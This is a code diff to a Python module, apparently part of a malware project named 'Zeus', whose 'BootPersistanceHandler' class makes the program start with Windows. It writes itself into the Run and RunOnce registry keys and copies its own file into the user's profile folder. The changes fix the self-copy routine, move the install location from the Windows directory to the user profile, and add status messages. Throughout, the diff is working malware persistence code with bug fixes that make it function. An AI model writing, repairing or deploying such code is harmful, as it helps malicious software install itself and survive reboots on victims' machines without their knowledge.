@@ -1,7 +1,7 @@
 import platform
 import os
 import os.path
-from shutil import copyfile
+from shutil import copy
 
 try:
     import _winreg as winreg
@@ -25,11 +25,8 @@ class BootPersistanceHandler:
     WINDOWS_REGISTRY_START_UP_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
     WINDOWS_ALTERNATIVE_REGISTRY_START_UP_PATH = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
 
-    def isWindows():
-        return (platform.system().lower() == "windows")
-
     def addSelfToSystemToBoot(self):
-        if(platform.system().lower() == "windows"):
+        if (platform.system().lower() == "windows"):
             # 1. Use registry
             if winreg is not None:
                 self.implantToRegistry()
@@ -84,7 +81,7 @@ class BootPersistanceHandler:
         return  False
 
     def valuesToDict(self, key):
-        """Convert a registry key's values to a dictionary."""
+        # Convert a registry key's values to a dictionary
         dict = {}
         size = winreg.QueryInfoKey(key)[1]
         for i in range(size):
@@ -99,8 +96,14 @@ class BootPersistanceHandler:
         finalDestination = r"%s\%s" % (destinationFolder, zeusFileName)
 
         if not os.path.isfile(finalDestination):
-            copyfile(os.path.abspath(__file__), destinationFolder)
+            source = __file__
+            destination = r"%s/%s" % (destinationFolder.replace("\\", "/"), zeusFileName)
+            print("[i] Zeus copy itself to: %s" % destination)
 
+            copy(source, destination)
+        else:
+            destination = r"%s/%s" % (destinationFolder.replace("\\", "/"), zeusFileName)
+            print("[i] Zeus already installed in: %s" %destination)
 
-    if(platform.system().lower() == "windows"):
-        WINDOWS_START_UP_FOLDER_PREFIX = os.environ['WINDIR']
+    if (platform.system().lower() == "windows"):
+        WINDOWS_START_UP_FOLDER_PREFIX = os.environ['userprofile']
